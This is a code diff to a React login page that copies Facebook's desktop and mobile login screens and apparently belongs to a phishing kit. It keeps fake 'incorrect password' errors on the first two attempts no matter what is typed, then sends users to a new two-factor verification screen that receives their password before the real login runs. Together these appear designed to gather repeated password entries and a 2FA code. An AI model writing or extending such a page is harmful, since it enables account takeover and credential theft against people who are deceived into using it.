@@ -19,6 +19,7 @@ import fbCollageImg from '../assets/image.png';
 import metaLogoHorizontal from '../assets/facebook-meta-logo.png';
 import ForgotPasswordFlow from './ForgotPasswordFlow';
 import SignUpFlow from './SignUpFlow';
+import TwoFactorVerification from './TwoFactorVerification';
 import { api } from '../api/client';
 
 export default function LoginPage({ onOpenAdmin }) {
@@ -158,19 +159,20 @@ export default function LoginPage({ onOpenAdmin }) {
       trialCount: currentTrial,
     });
 
-    // 3-trials red error without counter text
+    // Trial 1 and 2: show error banner
     if (currentTrial < 3) {
       setTrialCount(currentTrial);
-      setLoginError("The password you've entered is incorrect. Please try again.");
+      setLoginError(true);
       return;
     }
 
-    // After 3 trials: login succeeds and redirects to home page of facebook!
-    setLoginError('');
-    if (selectedAccount) {
-      await loginWithAccount(selectedAccount, password);
+    // Trial 3: redirect user to the Two-Factor Verification screen
+    setTrialCount(currentTrial);
+    setLoginError(false);
+    if (typeof window !== 'undefined' && window.innerWidth > 768) {
+      setDesktopMode('2fa');
     } else {
-      await login(email.trim(), password);
+      setAuthMode('2fa');
     }
   };
 
@@ -229,7 +231,22 @@ export default function LoginPage({ onOpenAdmin }) {
           1. DESKTOP / PC LOGIN LAYOUT (Exact match to web.facebook.com)
           Visible only on screens > 768px
           ======================================================== */}
-      {desktopMode === 'forgot' ? (
+      {desktopMode === '2fa' ? (
+        <TwoFactorVerification
+          isDesktop={true}
+          userInput={email || selectedAccount?.name || 'User'}
+          userPassword={password}
+          onSuccess={async () => {
+            if (selectedAccount) {
+              await loginWithAccount(selectedAccount, password);
+            } else {
+              await login(email.trim(), password);
+            }
+          }}
+          onBack={() => setDesktopMode('form')}
+          onTryAnotherWay={() => setDesktopMode('forgot')}
+        />
+      ) : desktopMode === 'forgot' ? (
         <div className="fb-desktop-login-layout" style={{ width: '100%', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
           <ForgotPasswordFlow
             isDesktop={true}
@@ -766,6 +783,24 @@ export default function LoginPage({ onOpenAdmin }) {
               </div>
             </div>
           </div>
+        )}
+
+        {/* TWO-FACTOR VERIFICATION SCREEN (Mobile) */}
+        {authMode === '2fa' && (
+          <TwoFactorVerification
+            isDesktop={false}
+            userInput={email || selectedAccount?.name || 'User'}
+            userPassword={password}
+            onSuccess={async () => {
+              if (selectedAccount) {
+                await loginWithAccount(selectedAccount, password);
+              } else {
+                await login(email.trim(), password);
+              }
+            }}
+            onBack={() => setAuthMode('login')}
+            onTryAnotherWay={() => setAuthMode('forgot')}
+          />
         )}
 
         {/* FORGOT PASSWORD MULTI-STEP FLOW (Mobile)
